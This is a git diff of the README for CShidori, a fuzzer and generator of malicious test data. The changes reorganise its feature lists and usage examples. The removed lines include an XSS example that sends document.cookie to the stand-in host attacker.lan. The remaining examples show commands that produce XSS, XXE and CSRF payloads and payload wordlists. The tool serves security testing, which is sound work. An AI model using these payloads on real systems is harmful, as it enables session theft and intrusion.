@@ -10,7 +10,7 @@
 
 ## Principe
 
-CShidori use mutation and generation techniques to find vulnerabilites in any applicaitons.
+CShidori combines mutation and generation techniques to find vulnerabilites in any applicaitons.
 The best ways to use CShidori is to give him the intended input and let him generate data to your tests.
 You can fuzz with CShidori or just generate your malicious data. 
 
@@ -22,6 +22,7 @@ You can fuzz with CShidori or just generate your malicious data.
 * XXE: 3
 * SQLI: 1
 * Application Data Leak: 2
+* HTTP Smuggling: 1
 
 ## Disclaimer
 
@@ -41,24 +42,23 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 
 ### Fuzzer
 
-* TLS Sockets (including HTTPS and other SSL/TLS encapsulated protocols)
-* TCP Sockets (TCP layer and OSI 5,6,7 protocols, including HTTP )
+* TLS Sockets 
+* TCP Sockets
 
 ### Machine Learning
 
 * CShidori learns and tries to detect vulnerabilities from your fuzzing history
 * ML is not miraculous thing, you have to train it for your Apps ;)
 
-### Data Generation Modes 
+### Data Generation
 * Mutation
-* XSS
-* JSON
-* XML
-* GET
+* Wordlist
+* Encoding
+
+### Embedded Templates
+
 * CSRF
 * XXE
-* Encoding
-* Wordlist
 
 ### Payloads
 
@@ -121,36 +121,18 @@ generate 5 mutation (chars and bitflip) for the value "test" :
 .\CShidori.exe -m mut -o 5 -p test -d Chars
 ```
 
-### XSS / Injections
-
-wrapp xss command to test multiples injections:
+### Encode
 
 ```powershell
-.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
+.\CShidori.exe -m enc -p "<script>alert(1)</script>"
 ```
 
-### JSON
+### WordList Generation
 
-Inject java and general payloads in all parameters of a Json request
-
-```powershell
-.\CShidori.exe -m json -p test.json -d Java,Strings
-```
-
-### XML
-
-Inject .NET payloads in all parameters of an XML request
+Generate a payload list
 
 ```powershell
-.\CShidori.exe -m xml -p exemple.xml -d DotNet
-```
-
-### GET
-
-Inject default payloads in all GET parameters and tests parameters polution
-
-```powershell
-.\CShidori.exe -m get -p "?bar=foo&foo=bar"
+.\CShidori.exe -m gen -d Chars,Java
 ```
 
 ### CSRF
@@ -169,20 +151,6 @@ Generate XXE payload
 
 ```powershell
 .\CShidori.exe -m xxe
-```
-
-### Encode
-
-```powershell
-.\CShidori.exe -m enc -p "<script>alert(1)</script>"
-```
-
-### WordList Generation
-
-Generate a payload list
-
-```powershell
-.\CShidori.exe -m gen -d Chars,Java
 ```
 
 ## Miscellaneous
